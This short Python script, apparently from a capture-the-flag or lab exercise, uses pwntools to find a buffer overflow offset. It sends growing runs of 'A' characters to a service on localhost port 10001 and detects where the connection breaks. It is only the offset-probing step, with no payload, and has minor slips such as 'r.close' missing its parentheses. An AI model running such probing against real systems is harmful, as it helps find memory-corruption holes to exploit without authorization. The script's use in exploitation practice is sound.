from pwn import *
 
ip = '127.0.0.1'
port = 10001
 
def check_Overflow():
    for i in range(1,4096):
        try:
            r = remote(ip,port,level='error')
            response = r.recvuntil('WelCome my friend,Do you know password?\n')           
            r.send("A" * i)
            response = r.recv()
            r.close()
            if 'No password, no game' in response:
                i += 1
            else:
                r.close
                return i
 
        except EOFError as e:
            r.close()
            return i - 1
 
 
size = check_Overflow()
log.info('Overflow size : ' + str(size))
